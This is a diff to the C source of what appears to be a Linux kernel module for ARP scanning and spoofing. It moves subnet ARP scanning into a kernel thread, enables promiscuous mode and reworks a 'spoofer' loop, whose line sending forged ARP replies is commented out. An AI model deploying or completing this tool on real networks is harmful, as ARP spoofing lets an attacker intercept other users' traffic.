@@ -38,6 +38,7 @@ static struct nf_hook_ops arp_hook_ops; //arp hook operation
 static struct packet_type pktype; //ip handler
 
 static unsigned int max, net_ip;
+//static unsigned char vmac[] = {'W', 'H', 'O', 'A', 'M', 'I'};
 
 static void mem_free(void)
 {
@@ -65,7 +66,6 @@ static int init_device(void)
 	if (!netdev)
 		return -1;
 
-	//netdev->promiscuity ;
 	if (!netdev->ip_ptr)
 		return -1;
 
@@ -98,9 +98,9 @@ static int init_gateway(void)
 	if (!neigh)
 		return -1;
 
-	gw.paddr = ip;
 	//neighbour."ha" is mac address field.
 	memcpy(gw.haddr, neigh->ha, ETH_ALEN);
+	gw.paddr = ip;
 
 	printk("Gateway: %pI4[%pM]\n", &gw.paddr, gw.haddr);
 	return 0;
@@ -112,8 +112,8 @@ static unsigned int arp_hook(void * priv, struct sk_buff * skb, const struct nf_
 	unsigned char * ptr = (unsigned char *)(arp + 1); //payload	
 	unsigned int ip, pos;
 
-	if (ntohs(arp->ar_op) != ARPOP_REPLY)
-		goto finish;
+	//if (ntohs(arp->ar_op) != ARPOP_REPLY)
+		//goto finish;
 	
 	ip = *((unsigned int *)(ptr + 6));
 	pos = ntohl(ip & ~(netdev->ip_ptr->ifa_list->ifa_mask));
@@ -159,38 +159,49 @@ static void unreg_arp_hook(void)
 //	sha(*src_hw), sip(src_ip),
 //	tha(*target_hw), tip(dest_ip); 
 
-static void scanning(void)
+static int scanning(void * ptr)
 {
 	int base = 1, t;
 	unsigned int target = 0; //network byte order
-
+	
+	netdev->promiscuity += 1; //promiscuous mode on
 	for (; base < max; base++)
 	{
+		msleep(3);
+		if (kthread_should_stop())
+			break;
+
 		target = (net_ip | (htonl(base)));
 		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
 			0x12345678, netdev->broadcast, host.haddr, NULL);
-		msleep_interruptible(1);
-	}	
+	}
+	netdev->promiscuity -= 1; //promiscuous mode on
+
+	return 0;	
 }
 
 static int spoofer(void * ptr)
 {
 	unsigned int who = 0, t;
-
+	struct task_struct * scan = NULL;
+	
 	allow_signal(SIGUSR1); //allow interrupt
-	scanning(); //scanning thread
 
-	for (; ; who++)
+	scan = kthread_run(scanning, NULL, "scanner");
+	
+	for (; !kthread_should_stop(); who++)
 	{
+		msleep_interruptible(5);
+
 		if (who == max)
 		{
 			who = 0;
 			continue;
 		}
 
-		if (kthread_should_stop())
-			break;
 		if (!others[who])
+			continue;
+		if (others[who]->paddr == host.paddr)
 			continue;
 		if (others[who]->paddr == gw.paddr)
 			continue;
@@ -199,9 +210,11 @@ static int spoofer(void * ptr)
 
 		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
 			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
-		msleep_interruptible(1);
 	}
 	
+	if (scan->exit_state == 0)
+		kthread_stop(scan);
+
 	return 0;
 }
 
